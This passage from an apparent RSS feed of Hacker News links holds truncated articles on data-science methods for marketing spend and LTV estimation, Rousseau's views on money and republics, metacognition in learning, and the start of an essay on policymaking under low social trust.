with near real-time feedback on your ad performance. Connect this with the spend and projected LTV and you can get your ROI predictions and adjust budgets accordingly. With dozens or hundreds of campaigns and variations, the benefits of automation and optimization at this steps can be huge.</li></ol><p>In article we're interested in what role data science can play in the overall ad lifecycle, so we'll focus on the two parts that tend to benefit the most from mixing in data science: 1) performance estimation and 2) automated bidding and budgeting.</p><p>Before diving in, it's imporant to understand the<em> channel/campaign </em>nomenclature. By <em>channel</em> we consider an advertising platform, such as Google AdWords, Facebook, Youtube, etc. A <em>campaign</em> is a single piece of advertising aimed at specific audience, according to segments available on the <em>channel, </em>with a preset starting and end time.</p><p>When evaluating marketing performance, we might want to look at investment and ROI at the level of a channel, a single campaign or a group of similar campaigns. We'll see how these different levels of granularity influence the amount and quality of available data, and in consequence how that determines the approaches that can be taken.</p><h2 id="performance-estimation">Performance Estimation</h2><p>Ideally, for the purpose of marketing optimization we're interested in LTV and CAC (Customer Acquisition Cost) as the factor in the ROI equation: $$ROI=\frac{LTV}{CAC}$$</p><p>LTV modelling is a fundamental problem in business analytics and it is far from trivial to get it completely right. The exact models depend heavily on the type of business and the intended application. LTV models are generally more valuable if we can give good estimates very early in the user lifetime. However, the earlier we do it the less data we have at our disposal.</p><p>In <a href="https://www.appsflyer.com/blog/overcoming-ltv-modeling-pitfalls/">Pitfalls of Modeling LTV and How to Overcome Them</a>, Dmitry Yudovsky outlines several challenges that make it impossible for a cookie-cutter approach for LTV estimation to exist:</p><ul><li>Machine learning approaches are sometimes completely inadequate.<br>There might be lack of data necessary for long term LTV predictions. Also, even if we do have a large business with tons of historical data, there are cases when training models on year old data doesn't work well - maybe the product or the entire market is very different than a year or two ago.</li><li>Depending on whether we want to use LTV estimates for ad optimization, CRM efforts or corporate financial projections, we might have different requirements for model accuracy and cohort granularity at which we're making predictions (eg. single user, single campaign, group of campaigns, all users, etc.)</li></ul><p>Of course the problem is not intractable, and there are several common approaches. We'll look at a few case studies found in tech blogs from DoorDash, Airbnb and Lyft Engineering teams.</p><p>In <a href="https://doordash.engineering/2020/07/31/optimizing-marketing-spend-with-ml/">Optimizing DoorDash’s Marketing Spend with Machine Learning</a>, Doordash Engineering present their approach, where instead of directly estimating LTV, they model conversion rates as a function of marketing spend. We'll see later how these cost curves help to neatly optimize budget allocation across channels and campaigns.</p><p>Experience (data) tells us that any marketing channel will reach saturation at some point, so we can model cost curves, ie. $Conversion=f(Spend)$<em> </em>using a power function of the form $a\cdot Spend^{b}$.</p><figure><img src="https://blogboard.io/blog/content/images/2021/01/image.png" alt=""><figcaption>Cost curve of the shape $a\cdot Spend^{b}$. Image credit: <a href="https://doordash.engineering/2020/07/31/optimizing-marketing-spend-with-ml/">DoorDash Engineering</a></figcaption></figure><p>We can fit cost curves at any cohort level, and it's typically done at the granularity of a channel or campaign. Simply put, if for a given campaign we spent $x$ amount of money, and that brought us $y$ users, we have one data point, $(x, y)$.</p><p>However, when allocating budgets at a later stage, we might need to make decisions at the <em>campaign </em>level, which cause problems with insufficient amount of data. In the DoorDash Engineering article, Aman Dhesi explains this problem:</p><blockquote>For some channels like search engine marketing, we have thousands of campaigns that spend a small amount of money every week. This makes the weekly attribution data noisy. Some weeks these campaigns don’t spend at all, which makes the data sparse. Using this data as-is will result in unreliable cost curves and in turn suboptimal (potentially wildly so) allocation.</blockquote><p>At DoorDash they solve this problem by training separate models which use similar campaigns to fill in the gaps in the dataset with synthetic data. This approach brings with itself certain tradeoffs, described in the <a href="https://doordash.engineering/2020/07/31/optimizing-marketing-spend-with-ml/">original article</a>.</p><p>In a similar manner, as described in <a href="https://eng.lyft.com/lyft-marketing-automation-b43b7b7537cc">Building Lyft’s Marketing Automation Platform</a>, data scientists at Lyft would fit an LTV curve of the shape $LTV=a\cdot Spend^{b}$. However, they incorporate an additional degree of randomness by modelling $a$ and $b$ as random variables and estimating their parameters $(\mu_a, \sigma_a)$ and $(\mu_b, \sigma_b)$ from historical data. This helps them implement an explore-exploit approach in the bidding step, by instantiating LTV curves after sampling $a$ and $b$ from their respective distributions. We'll revisit this approach briefly at the end of next section.</p><p>As described in <a href="https://medium.com/airbnb-engineering/growing-our-host-community-with-online-marketing-9b2302299324">Growing Our Host Community with Online Marketing</a>, at Airbnb they face a problem stemming from the nature of their product and the market. When predicting LTV for an Airbnb home listing, two major problems are:</p><ol><li>Ad conversions for hosts are a very rare event. This poses problems with building large enough data sets. It also influences data tracking and attribution, where these systems have to be as precise as possible in order not to lose or wrongly attribute any data points.</li><li>Time from ad impression (user seeing an ad) to conversion (home listed on Airbnb) can be very long, sometimes weeks. This is a problem if you want to optimize and re-budget your campaigns soon after rollout - you simply don't have enough data yet.</li></ol><p>In the same post, Tao Cui describes the architecture of each part of Airbnb's marketing platform as well as the motivation for building the entire thing, along with choices of tech stack. </p><p>In another article dating from 2017, <a href="https://medium.com/airbnb-engineering/using-machine-learning-to-predict-value-of-homes-on-airbnb-9272d3d4739d">Using Machine Learning to Predict Value of Homes On Airbnb</a>, Robert Chang describes how they use machine learning (ending up using XGBoost in production) to estimate LTV of each listing. Framing it as a typical regression problem, they use hundreds of features, such as <em>location data, price with all the partial costs (eg. cleaning fee, discounts), availability, previous bookings, </em>to predict revenue from a listing after some fixed amount of time (eg. 1-year revenue). If you're curious, the post also describes some of the pieces of infrastructure used by the system and gives a high-level code examples of training pipeline construction.</p><p>In <a href="https://www.appsflyer.com/resources/gaming/predictive-modeling-app-marketers-guide/pros-and-cons-of-different-ltv-based-predictive-models-insights-from-top-marketers/">Insights on the Pros and Cons of LTV-based Predictive Models</a> an article from AppsFlyer, we can find a summary of pros and cons of the three common LTV modelling approaches for app-based businesses:</p><ol><li>Retention/ARPDAU model<br>If we have a fairly old and stable product with some historical data, we can leverage the fact that we know the shape of the retention curve and can fit a power curve to several early-retention data points. We also know the <em>Average Revenue Per Daily Active User (ARPDAU) </em>which tends to be stable over time for most freemium and micro-transaction apps (such as free to play games). With some math we can arrive at an estimate of the expected LTV using these two measures. For example, to estimate LTV by day 90 of user's lifetime we would use the following equation: &nbsp;$$LTV_{90}=ARPDAU\cdot\sum_{d=0}^{90}retention[d]$$</li><li>LTV ratio model<br>As a simple example, in order to get $LTV_{90}$ we'll use historical data to estimate the ratio $\frac{LTV_{90}}{LTV_{7}}$ and use the observed 7-day LTV to predict the 90-day LTV</li><li>Behavior driven/user-level models<br>We'd use user-level features to train our favorite machine learning model for regression. …</li></ol></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blogboard.io/blog/data-science-in-marketing-optimization/">https://blogboard.io/blog/data-science-in-marketing-optimization/</a></em></p>]]>
            </description>
            <link>https://blogboard.io/blog/data-science-in-marketing-optimization/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25670229</guid>
            <pubDate>Thu, 07 Jan 2021 12:25:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rousseau and the Republicanization of Money]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25669738">thread link</a>) | @werner17
<br/>
January 7, 2021 | https://jhiblog.org/2021/01/06/rousseau-and-the-republicanization-of-money/ | <a href="https://web.archive.org/web/*/https://jhiblog.org/2021/01/06/rousseau-and-the-republicanization-of-money/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<p>In order to stabilize the tumbling financial markets and maintain the liquidity of companies and states, central banks around the world responded to the Covid-19 pandemic by <a href="https://www.reuters.com/article/us-health-coronavirus-liquidity/central-banks-flash-the-cash-as-market-panic-drives-liquidity-squeeze-idUSKBN210174">increasing the money supply</a>.&nbsp; The public discussion about these fiscal and monetary decisions, from their sufficiency to their potential for triggering future inflation, are dominated by economists. The advice of political philosophers, meanwhile, especially those from centuries ago, is not particularly sought after.</p>



<p>Yet this was not always the case. From antiquity until well into the 19th century, European and North American political philosophy revolved around <a href="https://www.cambridge.org/core/books/cambridge-history-of-eighteenthcentury-political-thought/early-enlightenment-debate-on-commerce-and-luxury/23B4652A6F7A7CFDF1125578A8457E24">questions</a> of state financing, debt, property, and money. In other words, the relationship between economics and politics was at the heart of the theoretical debate. As such, it was also central for <a href="https://plato.stanford.edu/entries/rousseau/">Jean-Jacques Rousseau</a>, who wrote the entry “<a href="http://classiques.uqac.ca/classiques/Rousseau_jj/discours_economie_politique/discours_eco_pol.pdf">Économie politique</a>” for Diderot’s and d’Alembert’s <a href="https://quod.lib.umich.edu/d/did/"><em>Encyclopédie</em></a>, <a href="https://books.google.de/books?id=D_HJDwAAQBAJ&amp;lpg=PR1&amp;dq=Michael%20Sonenscher%2C%20Jean-Jacques%20Rousseau%3A&amp;hl=de&amp;pg=PA48#v=onepage&amp;q=Physiocrats%20letter&amp;f=false">corresponded with the Physiocrats</a>, and had none other than Adam Smith attentively <a href="https://books.google.de/books?id=Tb7FCQAAQBAJ&amp;printsec=frontcover&amp;dq=Politics+in+Commercial+Society&amp;hl=de&amp;sa=X&amp;ved=2ahUKEwicn_W61eLtAhVPCewKHVWsBLYQ6AEwAHoECAQQAg#v=onepage&amp;q=Politics%20in%20Commercial%20Society&amp;f=false">review</a> parts of his discourse on inequality.</p>



<p>Today, Rousseau is best known for his advocacy of strong republican ideals, and his focus on the common will and personal presence of the people in contrast to the principle of representation that characterizes the modern, liberal organization of state and government. It is this Rousseau whom Jürgen Habermas famously criticized in <a href="https://mitpress.mit.edu/books/between-facts-and-norms"><em>Between Facts and Norms</em></a> for overburdening citizens with demands for virtue and the common good. But when re-reading Rousseau’s works in the context of his time, it is striking that, much more so than political principles, economic considerations abound and place Rousseau at a great distance from our contemporary conditions.</p>







<p>In Rousseau’s mind, the Enlightenment thinkers, with whom he otherwise sided to considerable extent on political questions, articulated paradoxical economic and political demands. <a href="https://plato.stanford.edu/entries/montesquieu/">Montesquieu</a>, for example, considered it his political task to revive ancient ideas of a free state, so that the freedom of citizens would no longer be threatened by royal and feudal despotism. But unlike their ancient predecessors, Enlightenment intellectuals no longer sought to organize this republicanization on the basis of the self-sufficient <em>oikoi</em> of an agrarian economy, but instead with the help of the modern opportunities of trade and manufacture. As <a href="https://www.polthought.cam.ac.uk/seminar/introductions/intros2010-2011/hont">Istvan Hont</a> has <a href="https://books.google.de/books?id=Tb7FCQAAQBAJ&amp;printsec=frontcover&amp;dq=Politics+in+Commercial+Society&amp;hl=de&amp;sa=X&amp;ved=2ahUKEwicn_W61eLtAhVPCewKHVWsBLYQ6AEwAHoECAQQAg#v=onepage&amp;q=Politics%20in%20Commercial%20Society&amp;f=false">noted</a>, Rousseau turned against this idea of a commercial republicanism in the most resolute form.</p>



<p>In his <a href="https://books.google.de/books?id=kd2I5Fop3WMC&amp;printsec=frontcover&amp;dq=rousseau+discourse+on+inequality&amp;hl=de&amp;sa=X&amp;ved=2ahUKEwjdtY_A7vLtAhWOzqQKHeOfAUEQ6AEwAHoECAUQAg#v=onepage&amp;q=rousseau%20discourse%20on%20inequality&amp;f=false"><em>Discourse on Inequality</em></a>, Rousseau described how a society that accepted a liberalized economic sphere would also inevitably find itself in despotic political waters. Natural man’, who historically was in a harmonious balance with outer and inner nature in Rousseau’s formulation, became dangerously unbalanced when beginning to practice the division of labour, agriculture, and metallurgy. In this way, Rousseau <a href="https://www.degruyter.com/view/journals/dzph/60/6/article-p861.xml">made use of the dominant colonial discourses of his time, not to overturn them, but to reverse them</a>: Instead of tracking progress from “savage” to “civilised” man, Rousseau told a story of human degeneration. According to him, an economy based on the division of labour meant nothing other than individuals no longer being able to provide for their own subsistence from their own resources and, as a consequence, becoming dependent on one another. “From the moment that one man needed the help of another […] equality disappeared, property arose, labour became necessary” (<a href="https://www.marxists.org/reference/subject/economics/rousseau/inequality/ch02.htm">OC III, p. 171</a>). And this mutual dependence was never symmetric: instead, talents, skill, diligence, and physical abilities inevitably caused differences in property and conduct, such that social inequality arose. Having become dependent on his fellow men, a once ‘natural’ man could thus only relate to himself by way of relating to others, which deepened the state of interdependence.</p>



<p>Over time, Rousseau reasoned, the poor thus became dependent on being paid by the rich or on robbing them, and the rich became dependent on the poor remaining dependent. Conflicts would then arise within society. In his reading, this socialized state perpetually threatened to bring about the <a href="https://books.google.de/books?id=Tb7FCQAAQBAJ&amp;printsec=frontcover&amp;dq=Politics+in+Commercial+Society&amp;hl=de&amp;sa=X&amp;ved=2ahUKEwicn_W61eLtAhVPCewKHVWsBLYQ6AEwAHoECAQQAg#v=onepage&amp;q=Hobbesian%20outcome&amp;f=false">Hobbesian war of all against all</a> (45), which was only half-heartedly prevented by the &nbsp;introduction of formal equality before the law, even if only in order to make economic inequality permanent. But such a state is destined to slide down the same slippery slope as society already did: lawbreakers made magistrates necessary, which in turn necessitated elections, elections required political parties, these provoked civil wars, from which followed perpetual dictatorship and, finally, despotism. In essence, Rousseau’s message to his Enlightenment contemporaries was that no republic could be built on the basis of asymmetrical economic interdependence — and to him, trade, division of labor and money regimes were just that.</p>







<p>In so arguing, Rousseau wrote explicitly against the major political-economic theories of his time: against the physiocrats, against mercantilist ideas, but above all against Montesquieu’s idea that trade and commerce brought about a liberalization and pacification of the political sphere—an idea that would inspire <a href="https://www.britannica.com/biography/Sir-James-Steuart-Denham-4th-Baronet">James Denham-Steuart</a>, <a href="https://www.oxfordreference.com/view/10.1093/oi/authority.20110803100158190">John Millar</a>, <a href="https://plato.stanford.edu/entries/hume/">David Hume</a> and, later on, <a href="https://plato.stanford.edu/entries/smith-moral-political/">Adam Smith</a>. Montesquieu <a href="https://books.google.de/books?id=nW0PAAAAQBAJ&amp;printsec=frontcover&amp;dq=Hirschman+the+passions&amp;hl=de&amp;sa=X&amp;ved=2ahUKEwiwjMur1-LtAhXI-aQKHTAACOoQ6AEwAHoECAAQAg#v=onepage&amp;q=montesquieu&amp;f=false">reasoned</a> that modern commerce and manufactures made citizens independent of their rulers. If these rulers transgressed the limits of civic consent, one could easily withdraw one’s possessions, mobile capital or even money from the grasp of the crown. This threat to the control exercised by monarchy and feudal nobility automatically limited governmental power. Adam Smith thought <a href="https://books.google.de/books?id=Tb7FCQAAQBAJ&amp;printsec=frontcover&amp;dq=Politics+in+Commercial+Society&amp;hl=de&amp;sa=X&amp;ved=2ahUKEwicn_W61eLtAhVPCewKHVWsBLYQ6AEwAHoECAQQAg#v=onepage&amp;q=Politics%20in%20Commercial%20Society&amp;f=false">along similar lines</a> and expanded this argument: If cleverly managed, he wrote, even the rulers’ exorbitant claims to luxury and consumption could be used to create work and prosperity and, at the same time, bring about the rule of law. According to him, the complexity of flourishing trade in the cities and the growth of mutual interdependence overwhelmed the power that despots could muster to govern. &nbsp;With this, Montesquieu (like Smith later) turned against absolute monarchy from the outside, i.e. politically, in order to discipline it from the inside, i.e. economically.</p>



<p>Rousseau, however, turned these arguments against their proponents. His discussion of political economy in the <a href="https://www.marxists.org/reference/subject/economics/rousseau/inequality/ch02.htm"><em>Second Discourse</em></a> was precisely aimed at showing that what Montesquieu and Smith considered the disciplinary threat that citizens posed to their monarchs would turn into a disciplinary order that benefits the rich at the expense of the republic. For Rousseau, economic inequality, asymmetric economic interdependencies, and private interests prevented the formation of a common will. Therefore, it was perfectly consistent to him that, just as there should be no partisanship in the political world, the republic must presuppose the material self-sufficiency of its citizens. Thus, he ordered in the <a href="http://www.ibiblio.org/ml/libri/r/RousseauJJ_ContratSocial_s.pdf"><em>Contrat social</em></a> that no citizen of his ideal republic should be “so wealthy as to be able to buy another, and none so poor as to be forced to sell himself” (OC III, p. 391). Notably, this seemingly economic argument was premised on a political observation: the rich and the poor were equally dangerous to the common good, “from the one come the abettors of tyranny, from the other the tyrants; the trade in public liberty is always between them; the one buys and the other sells it” (OC III, p. 392).</p>



<p>However, anyone who thinks that Rousseau considered himself utopian is mistaken. Already in the <em>Contrat social</em>, he praised Corsica as one of the few exceptions that, under the historical conditions of his time, would still be capable of forming a republic along the lines he set forth — not least <a href="http://eprints.lse.ac.uk/69838/1/Hill_Enlightened%20savages_author_2017_Final.pdf">because, in the eyes of Rousseau</a>, Corsicans appeared uncivilized. After the latter had made some gains in the fight for Corsican independence, Matteo Buttafuoco approached Rousseau in 1764 with the <a href="https://journals.sagepub.com/doi/abs/10.1111/1467-9248.00322">request to draft a constitution for Corsica</a>. Rousseau enthusiastically agreed. Interestingly, his proposed constitution, which survived through his estate, is largely devoted to the economic rather than the political situation in Corsica. Rousseau recommended, for example, that a prerequisite for citizenship&nbsp; should be the possession of sufficient land to provide for oneself and one’s family, and so that the asymmetrical dependence described in the <em>Second Discourse </em>would not occur. Rousseau believed that there was enough territory available in Corsica to allow every inhabitant to own farmland.</p>







<p>But Rousseau knew, of course, how far modern conditions had advanced in comparison to antiquity. Large empires in the island’s geographical neighborhood, monetary and fiscal systems, trade, and manufactures were obstacles to the peaceful republicanization of the Corsicans. Rousseau’s response to these unfavorable conditions was as radical as it was consequential: limited foreign trade to prevent a dependence on neighboring territories, hardly any internal trade in order to conserve the independence of citizens from one another, and a requirement that manufacturers and craftsmen had to settle far away from the trading places to make their businesses costly and burdensome. Expressed in modern economic vocabulary: Rousseau tried to internalize the politically external costs of the economy—for the good of the republic.</p>



<p>It was the financial and monetary system that worried Rousseau the most. The virtualization of goods in the form of money provided the conditions for a limitless accumulation of wealth and thus disconnection from the polity. Money — although supplied and guaranteed for by the state — could become a vehicle for particular interests and, in the last consequence, for anti-republican developments. Therefore, according to Rousseau, money was to be kept to a minimum in Corsica and to be replaced as far as possible by a local barter economy that was to be administered by …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jhiblog.org/2021/01/06/rousseau-and-the-republicanization-of-money/">https://jhiblog.org/2021/01/06/rousseau-and-the-republicanization-of-money/</a></em></p>]]>
            </description>
            <link>https://jhiblog.org/2021/01/06/rousseau-and-the-republicanization-of-money/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25669738</guid>
            <pubDate>Thu, 07 Jan 2021 11:13:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is Metacognition?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25669594">thread link</a>) | @jrmorson
<br/>
January 7, 2021 | https://trendrep.net/metacognition-learning/ | <a href="https://web.archive.org/web/*/https://trendrep.net/metacognition-learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mvp-content-main">
<br>
<figure id="metacognition"><img src="https://trendrep.net/wp-content/uploads/2020/12/Metacognition-1-1024x493.jpg" alt="what is metacognition learning" width="768" height="370" title="what is metacognition learning" srcset="https://trendrep.net/wp-content/uploads/2020/12/Metacognition-1-1024x493.jpg 1024w, https://trendrep.net/wp-content/uploads/2020/12/Metacognition-1-300x144.jpg 300w, https://trendrep.net/wp-content/uploads/2020/12/Metacognition-1-768x370.jpg 768w, https://trendrep.net/wp-content/uploads/2020/12/Metacognition-1.jpg 1350w" sizes="(max-width: 768px) 100vw, 768px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20768%20370'%3E%3C/svg%3E" data-lazy-srcset="https://trendrep.net/wp-content/uploads/2020/12/Metacognition-1-1024x493.jpg 1024w, https://trendrep.net/wp-content/uploads/2020/12/Metacognition-1-300x144.jpg 300w, https://trendrep.net/wp-content/uploads/2020/12/Metacognition-1-768x370.jpg 768w, https://trendrep.net/wp-content/uploads/2020/12/Metacognition-1.jpg 1350w" data-lazy-src="https://trendrep.net/wp-content/uploads/2020/12/Metacognition-1-1024x493.jpg"></figure>
<h2>Metacognition definition</h2>
<p>Metacognition refers to “thinking about thinking” and was initiated as a notion by John Flavell, who is generally known as a founding <a href="https://trendrep.net/keri-hilson-pregancy/">father</a> of the field. Flavell explained that metacognition is the understanding you have of your own cognitive processes (your thinking), Flavell (1979). It is your capability to monitor your thinking processes through several strategies, like organizing, monitoring, and adapting. In addition, it is your capability to reflect upon the tasks or processes you undertake and to select and use the adequate strategies in your intercultural interactions.</p>
<p>Metacognition is considered a crucial element of successful learning. It includes self-regulation and self-reflection of strengths, weaknesses, and the types of strategies you develop. It is an essential instauration in culturally intelligent leadership because it emphasizes how you think along an issue or situation and the strategies you develop to treat this situation or problem.</p>
<p>Some people become habitual to getting trainers and consultants offer them the knowledge about cultures to the point where they are reliant on the coach, mentor, trainer, or consultant. However, they must learn to be experts in cultural scenarios themselves over metacognitive strategies like adapting, monitoring, self-regulation, and self-reflection. Culturally intelligent leaders may utilize metacognition to aid and teach themselves to reflect through their thinking.</p>
<p>Metacognition includes three components: metacognitive knowledge, metacognitive and emotions, and metacognitive strategies. Each of these is addressed in the next paragraphs.</p>
<h2>Why Teach Metacognitive Skills?</h2>
<p>Research demonstrates that metacognitive skills may be tutored to students to ameliorate their learning (Nietfeld &amp; Shraw, 2002; Thiede, Anderson, &amp; Therriault, 2003).</p>
<p>Constructing understanding necessitates both cognitive and metacognitive components. Trainees “construct knowledge” utilizing cognitive strategies, and they orientate, modulate, and assess their learning utilizing metacognitive strategies. It is through this “thinking about thinking,” this use of metacognitive strategies, that real learning happens. As students become more skilled at utilizing metacognitive strategies, they attain confidence and become more autonomous as learners.</p>
<p>Individuals with well-developed metacognitive competencies may analyze a problem or approach a learning task, choose adequate strategies, and decide about a course of measures to solve the problem or efficiently execute the task. They frequently reflect about their own thinking processes, taking time to reflect about and learn from mistakes&nbsp; (North Central Regional Educational Laboratory, 1995). Some pedagogical programs motivate students to participate in “metacognitive conversations” with themselves so that they can “talk” with themselves about their learning, the challenges they meet, and the ways in which they may self-compensate and continue learning.</p>
<p>Furthermore, individuals who prove a wide diversity of metacognitive competencies execute better on exams and accomplish work more efficiently—they use the right tool for the job, and they modify learning strategies as required, defining blocks to learning and changing tools or strategies to assure objectives accomplishment. Because Metacognition plays a crucial function in productive learning, it is insistent that mentors assist learners create metacognitively.</p>
<h2>Metacognitive Knowledge</h2>
<p>Metacognitive knowledge includes:</p>
<p> 1) learning processes and your confidence about how you learn and how you reflect others learn.</p>
<p> 2) the task of learning and how you process information.</p>
<p> 3) the strategies you develop and when you will utilize them.</p>
<p> Let us say you should to learn a new language in six months. Here is how you would reflect about it, using metacognitive knowledge:</p>
<ul><li>Learning Process: I am good at learning new languages and I think I may do this in the time period I have been given.</li></ul>
<ul><li> Task of Learning: To accomplish this task, I will need to reflect about the following:</li></ul>
<ol><li>&nbsp; &nbsp; How soon may I get information to begin learning the language?</li></ol>
<ol reversed="" start="2"><li>&nbsp; &nbsp; How much time would it take to learn the new language?</li></ol>
<ol reversed="" start="3"><li>&nbsp; &nbsp; What information is accessible to me to learn this new language?</li></ol>
<ol reversed="" start="4"><li>&nbsp; &nbsp; Is this language comparable to any language I have learned before?</li></ol>
<ol reversed="" start="5"><li>&nbsp; &nbsp; Will I be capable to learn the language in time?</li></ol>
<ol reversed="" start="6"><li>&nbsp; &nbsp; How difficult will it be for me to learn this language?</li></ol>
<ol reversed="" start="7"><li>&nbsp; &nbsp; What I have to do to learn the language?</li></ol>
<ul><li>The Strategies: I think learning this new language will take&nbsp; 12 months, but I only have 6 months to do it. I better check other ways to meet this goal. I think I will check if there is an accelerated language class that I may take. Maybe I must consider hiring a private tutor, or maybe I will just concentrate on learning the basics of the language.</li></ul>
<h2>Metacognition and Emotions&nbsp;</h2>
<p>Arnold Bennett, a British writer, explained that one may not have knowledge without having <a href="https://trendrep.net/what-is-teratogen-pregnancy/">emotions</a>, Bennett (1933). In metacognition, there are feelings and emotions present that are related to the objectives and tasks of learning. These elements of metacognition speaks to metacognitive experience, which is your internal response to learning. Your feelings and emotions serve as a feedback system to help you understand your progress and estimates, and your comprehension and connection of new information to the old, among other things.</p>
<p>When you learn a new language, for example, you can recall memories, information, and earlier experiences in your life to help you resolve the task of learning a new language. In doing this, your internal responses (metacognitive experience) might be frustration, disappointment, happiness, or satisfaction. Each of these internal responses may impact the task of learning a new language and determine your willingness to continue. Critical to metacognition is the capability to purposely nurture a positive mindset and positive feelings toward your learning.</p>
<h2>Metacognitive Strategies</h2>
<p>Metacognitive strategies are what you design to supervise your progress correlated with your learning and the tasks at hand. It is a process for controlling your thinking activities and to assure you are meeting your objectives. Metacognitive strategies for learning a new language may comprise the following:</p>
<ul><li>Monitoring whether you understand the language lessons;</li></ul>
<ul><li>Realizing when you fail to comprehend information addressed to you in the new language;</li></ul>
<ul><li>Identifying strategies that help you to develop your comprehension;</li></ul>
<ul><li>Adjusting your speed for learning the information (for example, studying for 2 hours, instead of 1 hour, every day);</li></ul>
<ul><li>Maintaining the attitude necessary to assure you accomplish the lessons in a timely manner;</li></ul>
<ul><li>Creating a check-in system at the end of each week to make sure you understand what you have learned.</li></ul>
<p>As one business manager of a reputed company told me:</p>
<p>Understanding cultural strategic reflecting is like this: When I work with people from various cultures, this is a framework and approach to help me comprehend how I think when I work with them. It helps me to recognize the cultural experiences I have had, and to identify preconceived notions I could have about their culture, whether it’s race/ethnicity, social culture, age group—you name it. Cultural strategic reflecting pushes me to develop experiences and new learning that helps me to complete my objectives as a global manager.G. Menefee (personal communication, May 12, 2010).</p>
<p>Individuals like this leader are good at applying strategies that focus their attention on the target at hand. They look for, and derive meaning from, cultural interacts and situations, and they adjust themselves to the situation when things do not pan out as they expected. Culturally intelligent leaders also supervise and organize their own learning processes. They have established a high motivation for learning the metacognitive mechanism, either because they know it is a benefit or because others tell them it is beneficial to them.</p>
<p>Knowledge of actual information and basic competences offers a foundation for developing metacognition. Metacognition empowers leaders to master information and solve problems more easily. When a leader has learned the fundamental competences required for intercultural interacts, they may strongly engage in the interaction because they do not have to consider the other dynamics and demands of the situation. Culturally intelligent leaders are capable to apply metacognition, and they are not afraid to use it in their daily life.</p>
<p>For those who lack basic intercultural skills, it is more hard for them to engage in the interaction. They are more occupied with finding the “right information,” the “right skills,” and the “right facts” required to solve the problem. In such situations, these kinds of leaders spend little time improving their metacognitive competencies, and the result is probably an inefficient solution to a problem. Designing a laundry list or checklist of do’s and don’ts will not help leaders improving their cultural intelligences.</p>
<br> </div></div>]]>
            </description>
            <link>https://trendrep.net/metacognition-learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25669594</guid>
            <pubDate>Thu, 07 Jan 2021 10:52:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making policy for a low-trust world]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25669507">thread link</a>) | @zby
<br/>
January 7, 2021 | https://www.slowboring.com/p/making-policy-for-a-low-trust-world | <a href="https://web.archive.org/web/*/https://www.slowboring.com/p/making-policy-for-a-low-trust-world">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3287f0c-8bd8-40ac-8040-8857ddb7e9ba_569x350.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3287f0c-8bd8-40ac-8040-8857ddb7e9ba_569x350.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a3287f0c-8bd8-40ac-8040-8857ddb7e9ba_569x350.jpeg&quot;,&quot;height&quot;:350,&quot;width&quot;:569,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:35572,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>The United States of America has become a country with low and falling levels of social trust. This is in some ways a rational response to elite failures, in some ways an inevitable consequence of the public becoming better educated, in some ways an unavoidable side effect of better information technology, and in some ways a deplorable thing that we should try to reverse. </p><p>But something I’ve become increasingly convinced of is that policymakers need to acknowledge that it’s a real feature of the landscape and adjust their decision-making accordingly. </p><p>In particular, they need to adjust it in an appropriate way. A very large share of the people involved in politics and government are lawyers, and their lawyerly instinct about the problem seems to be that you need to layer on more layers of process. If people are worried about the discretionary use of power, you need to make sure the decision-makers go through an elaborate compliance checklist. But as Princess Leia tried to explain to Grand Moff Tarkin, <a href="https://www.youtube.com/watch?v=-wntX-a3jSY">“the more you tighten your grip, the more star systems will slip through your fingers.”</a> </p><p>When you try to address low trust through compliance, you end up where Andrew Cuomo is —&nbsp;he’s creating an elaborate checklist for vaccine prioritization which is hard to follow, so he’s ramping up penalties for people who don’t comply, which is slowing vaccine administration and further eroding trust. </p><p>But the same basic problem pops up everywhere from fiscal stimulus and quantitative easing to <a href="https://pedestrianobservations.com/2020/12/31/streets-before-trust/">bike lanes</a>. </p><p>The correct way to respond to a low-trust environment is not to double down on proceduralism, but to commit yourself to the <a href="https://pedestrianobservations.com/2020/12/31/streets-before-trust/">“it does exactly what it says on the tin”</a> principle and implement policies that have the following characteristics:</p><ul><li><p>It’s easy for everyone, whether they agree with you or disagree with you, to understand what it is you say you are doing. </p></li><li><p>It’s easy for everyone to see whether or not you are, in fact, doing what you said you would do. </p></li><li><p>It’s easy for you and your team to meet the goal of doing the thing that you said you would do. </p></li></ul><p>That’s not a guarantee of political or policy success. Maybe you will pick terrible ideas and be a huge failure anyway. But this triad for success under conditions of distrust at least creates the <em>possibility</em> of success, where people will look back and decide that what you did worked. Committing yourself to that triad may involve some waste and inefficiency relative to a more theoretically optimal scheme with more means-testing. </p><p>And it will almost certainly involve a bit more high-handedness and less community consultation. But it allows you to establish 